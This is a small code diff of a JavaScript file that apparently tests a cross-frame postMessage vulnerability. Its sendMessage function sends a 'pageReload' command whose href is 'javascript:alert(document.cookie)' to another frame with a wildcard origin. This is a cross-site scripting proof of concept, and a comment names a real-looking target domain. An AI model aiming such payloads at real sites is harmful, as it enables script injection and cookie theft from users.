@@ -3,7 +3,7 @@
 // childwin = window.open("http://jflove.10010.com/projects?projectName=%E7%A7%AF%E5%88%86");
 
 function sendMessage(){
-	// console.log(document.getElementsByTagName("iframe"));
+	console.log(window.parent.frames[1].contentWindow);
 	window.parent.frames[1].contentWindow.postMessage({"command":"pageReload","href":"javascript:alert(document.cookie)"},'*');
 	alert('发送成功');
 }
